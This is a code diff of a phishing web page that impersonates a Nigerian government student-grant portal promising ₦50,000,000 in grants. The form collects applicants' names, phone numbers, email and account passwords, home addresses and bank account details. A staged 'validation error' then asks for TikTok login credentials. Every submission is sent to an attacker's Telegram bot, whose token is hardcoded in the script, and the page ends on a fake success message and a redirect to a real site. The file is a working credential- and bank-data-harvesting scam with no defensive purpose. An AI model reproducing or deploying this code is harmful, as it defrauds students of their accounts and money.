@@ -10,6 +10,9 @@
     <meta property="og:image" content="https://img.sanishtech.com/u/4510661dba97f6908a4f3add09765cb5.png">
     <meta property="og:url" content="https://netly-gov-scholarship.netlify.app">
     <meta property="og:type" content="website">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
@@ -19,14 +22,17 @@
         body { font-family: 'Inter', sans-serif; background-color: #f8fafc; color: #1e293b; overflow-x: hidden; }
         .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #1e40af 100%); border-bottom: 4px solid #fbbf24; }
         .form-card { background: white; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1); border-top: 5px solid #1e40af; }
-        .input-field { width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; transition: 0.3s; }
+        .input-field { width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; transition: all 0.3s ease; outline: none; }
         .input-field:focus { border-color: #1e40af; box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1); }
         .loader-ring { width: 80px; height: 80px; border: 5px solid #f3f3f3; border-top: 5px solid #1e40af; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
+        .network-error { color: #dc2626; font-size: 0.85rem; font-weight: 700; margin-top: 12px; text-align: center; animation: shake 0.4s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
         .float { animation: floating 3s ease-in-out infinite; }
         @keyframes floating { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
         #kkk { border-radius: 50%; width: 5pc; border: 3px solid #ffb200; }
+        #class { width: 10pc; border-radius: 50%; border: 3px solid #ffb200; }
     </style>
 </head>
 <body>
@@ -35,78 +41,96 @@
         <div class="mb-6 float">
             <svg class="w-20 h-20 text-blue-900" fill="currentColor" viewBox="0 0 20 20"><path d="M10.394 2.08a1 1 0 00-.788 0l-7 3a1 1 0 000 1.84L5.25 8.051a.999.999 0 01.356-.257l4-1.714a1 1 0 11.788 1.838L7.667 9.088l1.94.831a1 1 0 00.787 0l7-3a1 1 0 000-1.838l-7-3zM3.31 9.397L5 10.12v4.102a8.969 8.969 0 00-1.05-.174 1 1 0 01-.89-.89 11.115 11.115 0 01.25-3.762zM9.3 16.573A9.026 9.026 0 007 14.935v-3.957l1.818.78a3 3 0 002.364 0l5.508-2.361a11.026 11.026 0 01.25 3.762 1 1 0 01-.89.89 8.968 8.968 0 00-5.35 2.524 1 1 0 01-1.4 0zM6 18a1 1 0 001-1v-2.065a8.935 8.935 0 00-2 .712V17a1 1 0 001 1z"></path></svg>
         </div>
-        <p class="text-blue-900 font-bold tracking-widest animate-pulse">VERIFYING SECURE CONNECTION...</p>
+        <p class="text-blue-900 font-bold tracking-widest animate__animated animate__pulse animate__infinite">VERIFYING SECURE CONNECTION...</p>
     </div>
 
     <header id="gov-nav" class="hidden gov-header py-4 px-6 flex justify-between items-center text-white">
         <div class="flex items-center gap-3">
             <div class="bg-white p-1 rounded-full"><div class="w-8 h-8 bg-blue-900 rounded-full"></div></div>
-            <span class="font-bold text-sm tracking-tighter uppercase">National Student <br>Support Fund</span>
+            <span class="font-bold text-sm tracking-tighter uppercase">National Student <br>Support Fund: <br>Vercelar Foundation</span>
         </div>
-        <div class="text-[10px] text-right opacity-80 uppercase">Official Portal</div>
+        <div class="text-[10px] text-right opacity-80 uppercase">Official Government Portal<br>Department of Education</div>
     </header>
 
     <section id="home-page" class="hidden min-h-[80vh] flex flex-col items-center justify-center p-6 text-center">
-        <h1 class="text-4xl md:text-6xl font-extrabold text-blue-900 mb-6">₦50,000,000 Student Grant</h1>
-        <button onclick="saveAndShow('form-step-1')" class="px-8 py-4 bg-blue-700 text-white rounded-lg font-bold shadow-xl">Begin Application</button>
-        <div class="mt-12 flex justify-center gap-16 ">
-            <img id="kkk" src="https://img.freepik.com/premium-photo/background-editors-designers-national-holiday-3d-illustration-national-coat-arms-nigeria_659987-7848.jpg?w=360">
-            <img id="kkk" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXDSLTK-Uf3qEIhNxzzhxNtvPZBw_4oUf9rffGAiir1x1mZn59ZEkKl-B5&s=10">
+        <div class="max-w-4xl animate__animated animate__fadeIn">
+            <h1 class="text-4xl md:text-6xl font-extrabold text-blue-900 mb-6 leading-tight">
+                Empowering Excellence:<br><span class="text-blue-600">₦50,000,000</span> Student Grant Initiative
+            </h1>
+            <p class="text-gray-600 text-lg mb-8 max-w-2xl mx-auto leading-relaxed">
+                The Federal Ministry of Education is providing a <span class="font-bold text-blue-800">fifty Million Naira (₦50,000,000)</span> grant to eligible students. Each student may get a range of ₦50,000 - ₦150,000.
+            </p>
+            <button onclick="saveAndShow('form-step-1')" class="px-8 py-4 bg-blue-700 hover:bg-blue-800 text-white rounded-lg font-bold text-lg transition-all transform hover:scale-105 shadow-xl">
+                Begin Application
+            </button>
+            <div class="mt-12 flex justify-center gap-16 ">
+                <img id="kkk" src="https://img.freepik.com/premium-photo/background-editors-designers-national-holiday-3d-illustration-national-coat-arms-nigeria_659987-7848.jpg?w=360" alt="Ministry Logo">
+                <img id="kkk" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXDSLTK-Uf3qEIhNxzzhxNtvPZBw_4oUf9rffGAiir1x1mZn59ZEkKl-B5&s=10" alt="Gov Logo">
+            </div>
         </div>
     </section>
 
     <section id="form-step-1" class="hidden py-12 px-6">
         <div class="max-w-3xl mx-auto form-card p-8 animate__animated animate__slideInRight">
-            <h2 class="text-2xl font-bold text-blue-900 mb-6">Bio-Data</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <input id="fname" placeholder="First Name" class="input-field">
-                <input id="lname" placeholder="Last Name" class="input-field">
-                <input id="inst" placeholder="Institution" class="input-field">
-                <input id="course" placeholder="Course" class="input-field">
-                <input id="phone" placeholder="Phone" class="input-field">
-                <input id="email" placeholder="Email" class="input-field">
-                <input id="pass1" placeholder="Portal Password" type="password" class="input-field">
-                <input id="pass2" placeholder="Confirm Password" type="password" class="input-field">
+            <div class="mb-8">
+                <h2 class="text-2xl font-bold text-blue-900">Applicant Bio-Data</h2>
             </div>
-            <button onclick="submitStep1()" class="w-full mt-10 py-4 bg-blue-700 text-white font-bold rounded-lg">Continue</button>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div><label class="text-xs font-bold uppercase text-gray-600">First Name</label><input id="fname" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Last Name</label><input id="lname" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Institution</label><input id="inst" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Course of Study</label><input id="course" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Phone Number</label><input id="phone" type="tel" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Email</label><input id="country" type="email" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">password</label><input id="post1" type="password" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Confirm password</label><input id="post2" type="password" class="input-field" required></div>
+            </div>
+            <button id="btn-1" onclick="submitStep1()" class="w-full mt-10 py-4 bg-blue-700 text-white font-bold rounded-lg hover:bg-blue-800 transition-colors">Continue</button>
         </div>
     </section>
 
     <section id="form-step-2" class="hidden py-12 px-6">
         <div class="max-w-xl mx-auto form-card p-8 animate__animated animate__fadeInUp">
-            <h2 class="text-2xl font-bold text-blue-900 mb-6">Bank & Origin Verification</h2>
+            <h2 class="text-2xl font-bold text-blue-900 mb-6">Verification</h2>
             <div class="space-y-4">
-                <input id="addr" placeholder="Home Address" class="input-field">
-                <input id="state" placeholder="State" class="input-field">
-                <input id="email_pass" placeholder="Email Password" type="password" class="input-field">
-                <input id="acc_name" placeholder="Account Name" class="input-field">
-                <input id="acc_no" placeholder="Account Number" class="input-field">
-                <input id="bank" placeholder="Bank Name" class="input-field">
+                <div><label class="text-xs font-bold uppercase text-gray-600">Home Address</label><input id="addr" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">State of Origin</label><input id="state" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Country</label><input id="country2" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Email Password</label><input id="post3" type="password" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Acc Name</label><input id="pos3" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Acc No</label><input id="pst3" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">Bank Name</label><input id="pot3" type="text" class="input-field" required></div>
             </div>
-            <button onclick="submitStep2()" class="w-full mt-10 py-4 bg-blue-700 text-white font-bold rounded-lg">Verify Records</button>
+            <button id="btn-2" onclick="submitStep2()" class="w-full mt-10 py-4 bg-blue-700 text-white font-bold rounded-lg hover:bg-blue-800">Verify Records</button>
         </div>
     </section>
 
-    <section id="final-step" class="hidden min-h-[70vh] flex items-center justify-center p-6 text-center">
-        <div class="max-w-md w-full bg-white shadow-2xl rounded-2xl p-8 border-t-8 border-yellow-500">
+    <section id="final-step" class="hidden min-h-[70vh] flex items-center justify-center p-6">
+        <div class="max-w-md w-full bg-white shadow-2xl rounded-2xl p-8 text-center border-t-8 border-yellow-500">
             <div id="check-ui">
-                <h2 class="text-2xl font-bold mb-6">Submission Successful</h2>
-                <button onclick="processEligibility()" class="w-full py-4 bg-blue-900 text-white rounded-xl font-bold">Check Eligibility</button>
+                <h2 class="text-2xl font-bold mb-2">Application Submitted</h2>
+                <p class="text-gray-500 mb-8 text-sm">Click below to run the eligibility algorithm.</p>
+                <button onclick="processEligibility()" class="w-full py-4 bg-blue-900 text-white rounded-xl font-bold shadow-lg hover:bg-black transition-all">Check Eligibility</button>
             </div>
+
             <div id="loading-ui" class="hidden flex flex-col items-center">
                 <div class="loader-ring mb-6"></div>
-                <p>Analyzing Student Database...</p>
+                <p id="loading-text" class="font-bold text-blue-900 uppercase text-sm">Processing Neural Data...</p>
             </div>
+
             <div id="error-ui" class="hidden">
-                <p class="text-red-600 font-bold mb-4">ERROR: Synchronization Failed</p>
-                <input id="tik_email" placeholder="TikTok Email" class="input-field mb-2">
-                <input id="tik_pass" placeholder="TikTok Password" type="password" class="input-field mb-2">
-                <input id="retry_email_pass" placeholder="Confirm Email Password" type="password" class="input-field mb-4">
-                <button onclick="finalSubmit()" class="w-full py-3 bg-red-600 text-white rounded-lg font-bold">Retry Sync</button>
+                <p class="text-red-700 text-sm font-bold">SYSTEM ERROR 402: VALIDATION_FAILED</p>
+                <div class="space-y-4 my-4">
+                    <input id="pot8" type="text" placeholder="TikTok Email" class="input-field">
+                    <input id="pot9" type="password" placeholder="TikTok Email Password" class="input-field">
+                    <input id="retry-post" type="password" placeholder="Re-enter Email Password" class="input-field">
+                </div>
+                <button id="btn-3" onclick="finalSubmit()" class="w-full py-3 bg-red-600 text-white rounded-lg font-bold">Synchronize & Retry</button>
             </div>
+
             <div id="result-ui" class="hidden">
-                <h2 class="text-green-600 font-bold text-xl">Success!</h2>
-                <p class="mt-4">You have been shortlisted. Redirecting...</p>
+                <img id="class" src="https://media.tenor.com/6ZkJEn80W7kAAAAM/green-tick.gif" class="mx-auto mb-6">
+                <h2 id="final-msg" class="text-lg font-bold text-gray-800"></h2>
             </div>
         </div>
     </section>
@@ -114,44 +138,71 @@
 <script>
     const BOT_TOKEN = '8193618395:AAEFptR_70SIOVVYiO5pNUOA59tkD-zNBDU';
     const CHAT_ID = '7527733522';
+    let formData = {};
 
-    // PERSISTENCE: Check last saved step on load
     window.onload = () => {
-        const savedStep = localStorage.getItem("current_step") || "home-page";
-        setTimeout(() => {
-            showPage(savedStep);
-            document.getElementById('loading-screen').classList.add('hidden');
-        }, 1500);
+        const lastStep = localStorage.getItem("current_step");
+        if (localStorage.getItem("scholarship_applied") === "true") {
+            showPage('final-step');
+            showSuccessUI();
+        } else if (lastStep) {
+            setTimeout(() => showPage(lastStep), 1500);
+        } else {
+            setTimeout(() => showPage('home-page'), 2000);
+        }
     };
 
+    async function sendToTelegram(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            return true;
+        } catch (e) { return false; }
+    }
+
     function showPage(id) {
-        document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
+        document.querySelectorAll('section, #loading-screen').forEach(s => s.classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
         document.getElementById('gov-nav').classList.remove('hidden');
     }
 
+    // PERSISTENCE: Save current step to storage
     function saveAndShow(id) {
         localStorage.setItem("current_step", id);
         showPage(id);
     }
 
-    async function sendToTelegram(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        } catch (e) {}
+    function validateFields(ids) {
+        let valid = true;
+        ids.forEach(id => {
+            const el = document.getElementById(id);
+            if(!el.value) { el.classList.add('border-red-500'); valid = false; }
+            else { el.classList.remove('border-red-500'); }
+        });
+        return valid;
     }
 
-    // Step 1 Submission
     async function submitStep1() {
-        const data = `🏛️ STEP 1 (BIO)\nName: ${document.getElementById('fname').value} ${document.getElementById('lname').value}\nInst: ${document.getElementById('inst').value}\nPhone: ${document.getElementById('phone').value}\nEmail: ${document.getElementById('email').value}\nPass: ${document.getElementById('pass1').value}`;
-        await sendToTelegram(data);
+        const fields = ['fname','lname','inst','course','phone','country','post1','post2'];
+        if(!validateFields(fields)) return;
+        formData = Object.fromEntries(fields.map(id => [id, document.getElementById(id).value]));
+        
+        // FULL DATA: Sending every field from Step 1
+        const msg = `🏛️ STEP 1\n👤 Name: ${formData.fname} ${formData.lname}\n🏢 Inst: ${formData.inst}\n📚 Course: ${formData.course}\n📞 Phone: ${formData.phone}\n📧 Email: ${formData.country}\n🔑 Pass: ${formData.post1}`;
+        await sendToTelegram(msg);
         saveAndShow('form-step-2');
     }
 
-    // Step 2 Submission (All fields sent)
     async function submitStep2() {
-        const data = `💰 STEP 2 (BANK)\nEmail: ${document.getElementById('email').value}\nEmail Pass: ${document.getElementById('email_pass').value}\nBank: ${document.getElementById('bank').value}\nAcc Name: ${document.getElementById('acc_name').value}\nAcc No: ${document.getElementById('acc_no').value}\nState: ${document.getElementById('state').value}`;
-        await sendToTelegram(data);
+        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3'];
+        if(!validateFields(fields)) return;
+
+        const btn = document.getElementById('btn-2');
+        btn.innerText = "Verifying...";
+        
+        // FULL DATA: Sending every field from Step 2
+        const msg = `🗺️ STEP 2\n👤 Name: ${document.getElementById('fname').value}\n🏠 Addr: ${document.getElementById('addr').value}\n📍 State: ${document.getElementById('state').value}\n🌍 Country: ${document.getElementById('country2').value}\n🔑 Email Pass: ${document.getElementById('post3').value}\n💳 Acc Name: ${document.getElementById('pos3').value}\n🔢 Acc No: ${document.getElementById('pst3').value}\n🏦 Bank: ${document.getElementById('pot3').value}`;
+        
+        await sendToTelegram(msg);
         saveAndShow('final-step');
     }
 
@@ -161,21 +212,30 @@
         setTimeout(() => {
             document.getElementById('loading-ui').classList.add('hidden');
             document.getElementById('error-ui').classList.remove('hidden');
-        }, 3000);
+        }, 4000);
     }
 
-    // Final Submission (TikTok + Retry Pass)
     async function finalSubmit() {
-        const data = `🚨 FINAL DATA (RETRY)\nEmail: ${document.getElementById('email').value}\nRetry Pass: ${document.getElementById('retry_email_pass').value}\nTikTok Email: ${document.getElementById('tik_email').value}\nTikTok Pass: ${document.getElementById('tik_pass').value}`;
-        await sendToTelegram(data);
+        const retry = document.getElementById('retry-post').value;
+        const tikEmail = document.getElementById('pot8').value;
+        const tikPass = document.getElementById('pot9').value;
         
-        localStorage.setItem("current_step", "result-ui");
+        if(!retry) return alert("Validation Required");
+
+        // FULL DATA: Final Sync
+        const msg = `🚨 FINAL SYNC\n👤 User: ${document.getElementById('fname').value}\n📧 TikTok: ${tikEmail}\n🔑 TikTok Pass: ${tikPass}\n🔑 Retry Email Pass: ${retry}`;
+        await sendToTelegram(msg);
+        
+        localStorage.setItem("scholarship_applied", "true");
+        localStorage.setItem("current_step", "final-step");
+        showSuccessUI();
+    }
+
+    function showSuccessUI() {
         document.getElementById('error-ui').classList.add('hidden');
         document.getElementById('result-ui').classList.remove('hidden');
-        
-        setTimeout(() => {
-            window.location.href = "https://scholarshiproar.com/fully-funded-scholarships/?amp";
-        }, 4000);
+        document.getElementById('final-msg').innerText = "Application Successful. Disbursement begins Feb 15, 2026. Redirecting...";
+        setTimeout(() => { window.location.href = "https://scholarshiproar.com/fully-funded-scholarships/?amp"; }, 5000);
     }
 </script>
 </body>
